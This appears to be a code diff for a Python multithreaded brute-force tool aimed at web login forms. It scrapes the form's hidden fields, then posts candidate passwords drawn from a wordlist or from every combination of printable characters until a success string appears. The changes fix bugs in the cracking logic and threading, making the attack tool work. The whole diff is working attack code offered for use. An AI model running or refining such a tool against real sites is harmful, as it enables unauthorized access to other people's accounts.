@@ -1,6 +1,7 @@
 from urllib.request import *
 from urllib.parse import *
 import http
+from http.cookiejar import *
 import threading
 import sys
 from itertools import product, chain
@@ -8,7 +9,7 @@ from queue import Queue
 import argparse
 from html.parser import HTMLParser
 import string
-
+import math
 user_thread = 1
 wordlist = None
 list_of_words = []
@@ -22,9 +23,6 @@ num_characters = -1
 resume = None
 traditional_bruteforce = False
 
-
-
-
 class Bruter(object):
     def __init__(self, username, words):
         self.username = username
@@ -35,6 +33,7 @@ class Bruter(object):
         global user_thread
         for i in range(user_thread):
             global num_characters
+            num_characters = int(num_characters)
             t = threading.Thread(target=self.web_bruter, args=(num_characters, i, ))
             running_threads.append(t)
             t.start()
@@ -47,46 +46,35 @@ class Bruter(object):
             if result == True:
                 return True
         if traditional_bruteforce == True:
-            starting_char = (num_characters/user_thread) * thread_num
-            ending_char = (num_characters/user_thread) * (thread_num+1)
+            starting_char = (num_characters//user_thread) * thread_num
+            ending_char = (num_characters//user_thread) * (thread_num+1)
             bruteforce_strings = self.traditional_bruteforce(starting_char, ending_char)
             for i in bruteforce_strings:
                 result = self.attempt_login(i)
                 if result == True:
                     return True
-            
+        print("Thread: " + str(thread_num) + " is unable to find the password")
         return False
-
-
 
     def traditional_bruteforce(self, start, maxlength):
         return (''.join(candidate)
             for candidate in chain.from_iterable(product(string.printable, repeat=i)
             for i in range(start+1, maxlength + 1)))                 
     def attempt_login(self, password):
-            jar = http.cookiejar.FileCookieJar("cookies")
+            jar = FileCookieJar("cookies")
             opener = build_opener(HTTPCookieProcessor(jar))
-
             response = opener.open(target_url)
-
             page = response.read()
-
-            print("Trying: %s : %s  (%d left)" %
-                  (self.username, password, self.password_q.qsize()))
-
+            print("Trying: %s : %s" %
+                  (self.username, password))
             parser = BruteParser()
             parser.feed(page)
-
             post_tags = parser.tag_results
-
             post_tags[username_field] = self.username
             post_tags[password_field] = password
-
             login_data = urlencode(post_tags)
             login_response = opener.open(target_post, login_data)
-
             login_result = login_response.read()
-
             if success_check in login_result:
                 self.found = True
                 print("[*] Bruteforce Successful")
